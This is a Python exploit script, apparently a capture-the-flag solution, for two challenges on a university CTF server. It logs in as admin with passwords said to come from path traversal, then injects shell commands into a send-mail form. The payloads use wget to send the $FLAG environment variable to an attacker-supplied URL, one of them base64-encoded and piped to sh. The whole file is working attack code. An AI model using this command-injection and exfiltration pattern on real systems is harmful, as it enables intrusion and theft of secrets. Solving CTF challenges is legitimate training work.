import requests
import base64
import sys

challenge_url = 'http://cyberchallenge.disi.unitn.it:%d'
ports = [50000, 50005]

# info retrieved through path traversal (analysis of app.py)
pwds = ['MegaComplicatedPasswordYouWillNeverGuessThis!', 'MegaComplicatedPasswordThatWeHadToChange!']

# formatted commands to inject
commands = [
    '"; wget "%s', 
    '"; echo %s | base64 -d | sh; echo "'
]


# ======================== NETBISCA1 ========================

s = requests.Session()
attacker_url = sys.argv[1] + '?flag=$FLAG'

print("Netbisca1")
print("URL: ", challenge_url %ports[0])

# login with admin
res = s.post(challenge_url %ports[0] + '/login', data={'username': 'admin', 'password': pwds[0]})

# command injection
print('Command: ', commands[0] %attacker_url)
res = s.post(challenge_url %ports[0] + '/send-mail', data={'to': 'user@user.com', 'subject': 'culo', 'message': commands[0] %attacker_url })


# ======================== NETBISCA2 ========================

s = requests.Session()
attacker_url = 'wget ' + sys.argv[1] + '?flag=$FLAG'

print("Netbisca2")
print("URL: ", challenge_url %ports[1])

# login with admin
res = s.post(challenge_url %ports[1] + '/login', data={'username': 'admin', 'password': pwds[1]})

# command injection
print('Command: ', commands[1] %base64.b64encode(attacker_url.encode()).decode())
res = s.post(challenge_url %ports[1] + '/send-mail', data={'to': 'user@user.com', 'subject': 'culo', 'message': commands[1] %base64.b64encode(attacker_url.encode()).decode() })
